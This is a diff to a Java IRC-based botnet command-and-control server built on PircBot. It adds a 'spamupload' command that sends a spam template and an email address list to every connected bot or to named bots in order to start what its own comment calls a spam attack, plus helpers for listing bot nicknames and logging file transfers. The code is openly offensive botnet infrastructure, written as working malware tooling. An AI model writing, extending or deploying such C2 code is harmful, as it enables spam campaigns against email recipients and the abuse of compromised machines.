@@ -92,6 +92,15 @@ public class BotnetServer extends PircBot {
 		System.out.println("<" + sender + ">: " + message);
 	}
 	
+	protected void onFileTransferFinished(DccFileTransfer transfer, Exception e) {
+		if (e != null) {
+			System.out.println("\tThere was a problem trasferring the file\n\t" + e.getMessage());
+		} else {
+			String fileName = transfer.getFile().getName();
+			System.out.println("\tSuccessfully delivered " + fileName + " to " + transfer.getNick());
+		}
+	}
+	
 	/**
 	 * Reads input from the user and handles the command.
 	 */
@@ -122,9 +131,9 @@ public class BotnetServer extends PircBot {
 			listChannels();
 		//Respond to a names command by getting the user on CHANNEL and printing their nicks
 		} else if (s.toLowerCase().equals("names")) {
-			User[] bots = getUsers(CHANNEL);
+			String[] bots = getUserNames();
 			for (int i = 0; i < bots.length; i++) {
-				System.out.println("\t" + bots[i].toString());
+				System.out.println("\t" + bots[i]);
 			}
 		//Respond to setop command by acquiring exclusive operator status (DOESN'T WORK)
 		} else if (s.toLowerCase().equalsIgnoreCase("setop")) {
@@ -147,11 +156,7 @@ public class BotnetServer extends PircBot {
 			} else {
 				String[] botNames;
 				if (parts[4].equalsIgnoreCase("all")) {
-					User[] bots = getUsers(CHANNEL);
-					botNames = new String[bots.length];
-					for (int i = 0; i < bots.length; i++) {
-						botNames[i] = bots[i].getNick();
-					}
+					botNames = getUserNames();
 				} else {
 					botNames = Arrays.copyOfRange(parts, 4, parts.length);
 				}
@@ -162,6 +167,25 @@ public class BotnetServer extends PircBot {
 					}
 				}
 			}
+		//Respond to a spam command by sending over the spam template file and emails file and then initiating a spam attack
+		} else if (s.toLowerCase().startsWith("spamupload")) {
+			String[] parts = s.split(" ");
+			if (parts.length < 4) {
+				System.out.println("Usage: spamupload template emails bot [more bots]");
+			} else {
+				String[] botNames;
+				if (parts[3].equalsIgnoreCase("all")) {
+					botNames = getUserNames();
+				} else {
+					botNames = Arrays.copyOfRange(parts, 3, parts.length);
+				}
+				for (int i = 0; i < botNames.length; i++) {
+					if (!botNames[i].equals(NAME)) {
+						dccSendFile(new File(parts[1]), botNames[i], TIMEOUT);
+						dccSendFile(new File(parts[2]), botNames[i], TIMEOUT);
+					}
+				}
+			}
 		//Respond to a message beginning with a colon by messaging the CHANNEL
 		} else if (s.startsWith(":")) {
 			sendMessage(CHANNEL, s.substring(1));
@@ -169,6 +193,15 @@ public class BotnetServer extends PircBot {
 		} else if (!s.isEmpty()) {
 			sendRawLine(s);
 		}
+	}
+	
+	public String[] getUserNames() {
+		User[] bots = getUsers(CHANNEL);
+		String[] names = new String[bots.length];
+		for (int i = 0; i < bots.length; i++) {
+			names[i] = bots[i].getNick();
+		}
+		return names;
 	}
 	
 	/**
